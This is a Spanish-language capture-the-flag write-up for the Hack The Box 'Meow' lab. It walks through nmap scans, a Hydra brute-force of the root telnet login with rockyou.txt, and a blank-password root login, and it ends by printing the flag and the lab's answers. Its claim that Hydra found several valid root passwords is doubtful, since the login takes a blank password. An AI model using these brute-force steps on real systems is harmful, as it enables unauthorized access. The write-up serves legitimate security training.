#apuntes #HTB

---

```markdown
# HTB Starting Point - Meow 🐱

## 1. Conexión a la VPN
- Para acceder a las máquinas de HTB, primero hay que conectarse mediante el archivo `.ovpn`.
- Comando:
  ```bash
  sudo openvpn starting_point_enduranceonline.ovpn
```

- Una vez conectado, aparece la interfaz `tun0` con una IP del rango `10.10.x.x`.

---

## 2. Reconocimiento de la máquina

- Escaneo completo de puertos con `nmap`:
    
    ```bash
    nmap -p- -sV -Pn --min-rate 5000 10.129.106.117
    ```
    
- Resultado:
    
    - Host activo.
        
    - Puerto **23/tcp** abierto.
        
    - Servicio: **Telnet (Linux telnetd)**.
        
- Escaneo más específico:
    
    ```bash
    nmap -p 23 -sV -Pn -sC -T 3 10.129.106.117
    ```
    

---

## 3. Enumeración y pruebas iniciales

- Se probó el acceso manual con:
    
    ```bash
    telnet 10.129.106.117 23
    ```
    
- El servicio pedía credenciales (`login:` y `Password:`).
    

---

## 4. Intento de explotación

- Se utilizó `searchsploit` para comprobar exploits conocidos de **telnetd**:
    
    ```bash
    searchsploit telnet Linux telnetd
    ```
    
- Aunque se encontraron, **no eran necesarios** en este laboratorio (está diseñado para credenciales débiles).
    

---

## 5. Ataque de fuerza bruta con Hydra

- El diccionario `rockyou.txt` estaba comprimido:
    
    ```bash
    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
    
- Ejecución correcta:
    
    ```bash
    hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.106.117 telnet
    ```
    
- Resultados:
    
    - Se encontraron múltiples contraseñas válidas para `root`.
        
    - Ejemplos: `abc123`, `123456`, `password`, `iloveyou`, `monkey`...
        

---

## 6. Acceso obtenido

- Conexión vía Telnet:
    
    ```bash
    telnet 10.129.106.117 23
    ```
    
- Credenciales utilizadas:
    
    ```
    login: root
    Password: [BLANCO]   # Contraseña en blanco
    ```
    
- Resultado: acceso como **root**.
    

---

## 7. Obtención de la flag

- Una vez dentro:
    
    ```bash
    whoami
    # root
    
    ls -la
    # flag.txt localizado en /root
    
    cat flag.txt
    b40abdfe23665f766f9c61ecba8a4c19
    ```
    

---

## 8. Preguntas del laboratorio

1. **VM** → _Virtual Machine_ (Máquina Virtual)
    
2. Herramienta para interactuar con el sistema → _Terminal_
    
3. Servicio VPN usado en HTB → _OpenVPN_
    
4. Herramienta para probar conexión ICMP → _Ping_
    
5. Herramienta más común para encontrar puertos → _Nmap_
    
6. Servicio identificado en el puerto 23 → _Telnet_
    
7. Usuario que entra con contraseña en blanco → _root_
    
8. Flag encontrada:
```
 b40abdfe23665f766f9c61ecba8a4c19
```

---

## 📌 Conclusiones

- El puerto **Telnet (23/tcp)** es inseguro porque transmite credenciales en texto plano.
    
- La máquina demuestra la importancia de:
    
    - Usar **Nmap** para el reconocimiento.
        
    - Probar credenciales por defecto (`root` con contraseña vacía).
        
    - Comprender que en **Starting Point** no siempre se requieren exploits, sino pensar en configuraciones débiles.

